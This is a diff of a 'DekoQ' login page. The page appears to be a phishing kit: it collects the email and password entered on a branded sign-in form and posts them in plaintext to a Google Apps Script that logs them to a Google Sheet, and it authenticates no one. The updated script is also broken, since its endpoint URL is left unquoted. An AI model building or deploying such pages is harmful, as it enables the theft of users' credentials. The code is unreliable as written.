@@ -1,83 +1,90 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DekoQ Login</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #0056D8;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #007BFF, #0056b3);
+      font-family: 'Arial', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
-    .login-container {
-      background-color: #fff;
+    .container {
+      background: white;
       padding: 2rem;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 300px;
-    }
-    .login-container h1 {
-      color: #0056D8;
+      border-radius: 12px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
       text-align: center;
+      width: 90%;
+      max-width: 400px;
     }
-    .login-container input {
+    h2 {
+      margin-bottom: 1.5rem;
+      color: #333;
+    }
+    input[type="email"],
+    input[type="password"] {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      padding: 0.8rem;
+      margin-bottom: 1rem;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 8px;
+      font-size: 1rem;
     }
-    .login-container button {
-      width: 100%;
-      padding: 10px;
-      background-color: #121113;
-      color: #fff;
+    button {
+      background: #007BFF;
+      color: white;
       border: none;
-      border-radius: 5px;
-      font-weight: bold;
+      padding: 0.8rem 1.2rem;
+      border-radius: 8px;
+      font-size: 1rem;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
-    .login-container button:hover {
-      background-color: #000;
+    button:hover {
+      background: #0056b3;
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <h1>DekoQ</h1>
-    <form id="login-form">
-      <input type="email" id="email" placeholder="Email" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Submit</button>
+  <div class="container">
+    <h2>Login to DekoQ</h2>
+    <form>
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Login</button>
     </form>
   </div>
 
   <script>
-    document.getElementById("login-form").addEventListener("submit", async function(e) {
+    const form = document.querySelector("form");
+    const scriptURL = https://script.google.com/macros/s/AKfycbypRR6D0Lk0Xo_KHvdiDz9oIVxKOqC3Br9eTEEjl08T-VZZo7ivKztkNUsnnPb31NYbYg/exec// << ใส่ URL Google Script ของคุณตรงนี้
+
+    form.addEventListener("submit", e => {
       e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+      const email = form.email.value;
+      const password = form.password.value;
 
-      const response = await fetch("https://script.google.com/macros/s/AKfycbzAw9BNSCksFI2dXmV18V0dsbdJ-U93qgcAQ4FYnbb1gaaw_20VhCRjU8a1cDTrWhxVvg/exec", {
+      fetch(scriptURL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password })
-      });
-
-      if (response.ok) {
-        alert("ส่งข้อมูลเข้า Google Sheet สำเร็จ!");
-        e.target.reset();
-      } else {
-        alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
-      }
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("ส่งข้อมูลสำเร็จแล้ว!");
+          form.reset();
+        } else {
+          alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
+        }
+      })
+      .catch(error => alert("Error: " + error));
     });
   </script>
 </body>
